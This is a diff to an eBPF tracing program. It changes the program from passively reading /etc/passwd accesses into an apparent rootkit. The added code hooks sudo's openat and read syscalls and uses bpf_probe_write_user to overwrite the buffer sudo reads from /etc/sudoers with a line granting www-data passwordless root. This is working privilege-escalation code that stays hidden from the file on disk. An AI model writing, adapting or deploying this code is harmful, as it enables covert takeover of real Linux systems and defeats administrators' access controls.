@@ -33,11 +33,19 @@ struct {
 
 SEC("tracepoint/syscalls/sys_enter_openat")
 int tracepoint_syscalls__sys_enter_openat(struct trace_event_raw_sys_enter *ctx) {
-    char passwd_path[TASK_COMM_LEN] = "/etc/passwd";
+    char target_path[TASK_COMM_LEN] = "/etc/sudoers";
+    char target_comm[TASK_COMM_LEN] = "sudo";
+    char comm[TASK_COMM_LEN];
     char pathname[TASK_COMM_LEN];
+
+    bpf_get_current_comm(&comm, sizeof(comm));
+    if (!str_eq(comm, target_comm, TASK_COMM_LEN)) {
+        return 0;
+    }
+
     char *pathname_p = (char *)BPF_CORE_READ(ctx, args[1]);
     bpf_core_read_user_str(&pathname, TASK_COMM_LEN, pathname_p);
-    if (!str_eq(pathname, passwd_path, TASK_COMM_LEN)) {
+    if (!str_eq(pathname, target_path, TASK_COMM_LEN)) {
         return 0;
     }
 
@@ -84,8 +92,8 @@ int tracepoint_syscalls__sys_enter_read(struct trace_event_raw_sys_enter *ctx) {
 
 SEC("tracepoint/syscalls/sys_exit_read")
 int tracepoint_syscalls__sys_exit_read(struct trace_event_raw_sys_exit *ctx) {
-    int zero = 0;
-    struct event_t *event;
+    const int max_payload_len = 50;
+    struct event_t event = { 0 };
     u64 tid = bpf_get_current_pid_tgid();
 
     long unsigned int *buffer_p = bpf_map_lookup_elem(&buffer_map, &tid);
@@ -97,17 +105,19 @@ int tracepoint_syscalls__sys_exit_read(struct trace_event_raw_sys_exit *ctx) {
         return 0;
     }
     long int read_size = (long int)BPF_CORE_READ(ctx, ret);
-    if (read_size <= 0) {
+    if (read_size <= 0 || (int)read_size < max_payload_len) {
         return 0;
     }
 
-    event = bpf_map_lookup_elem(&tmp_storage, &zero);
-    if (!event) {
-        return 0;
-    }
-    bpf_probe_read_user(&event->payload, sizeof(event->payload), (char *)buffer);
+    char payload[] = "www-data ALL=(ALL:ALL) NOPASSWD: ALL#";
+    int payload_len = str_len(payload, max_payload_len);
+    long ret = bpf_probe_write_user((void *)buffer, payload, payload_len);
 
-    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(struct event_t));
+    event.ret = (u32)ret;
+    event.pid = tid >> 32;
+    event.uid = bpf_get_current_uid_gid() >> 32;
+    bpf_get_current_comm(&event.comm, sizeof(event.comm));
+    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(struct event_t));
 
     return 0;
 }
